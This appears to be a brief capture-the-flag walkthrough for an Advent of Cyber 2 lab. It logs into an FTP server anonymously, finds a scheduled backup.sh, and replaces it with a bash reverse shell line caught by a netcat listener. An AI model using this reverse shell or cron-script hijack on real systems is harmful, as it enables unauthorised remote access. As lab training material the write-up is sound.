# [Network] FTP and netcat and reverse shell

IP: 10.10.212.125

Advent of Cyber 2: 

Reverse Shell cheat sheet: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp

### Name the directory on the FTP server that has data accessible by the "anonymous" user
- First we use `ftp 10.10.212.125`
- When prompt to use the username, type `anonymous`
- Answer is `public`

### What script gets executed within this directory?
- `cd public`
- `backup.sh`

### What movie did Santa have on his Christmas shopping list?
- `get shoppinglist.txt`
- `The Polar Express`

### Netcat onto the FTP server
- Notice the `backup.sh` automatically run every 1 minute so we add a reverse shell script to make it work. 
- Get the sh and replace with the line `bash -i >& /dev/tcp/<your_ip>/4444 0>&1`. Put the sh files back again.
- `nc -lvnp 4444`
- Get the damn flag :)
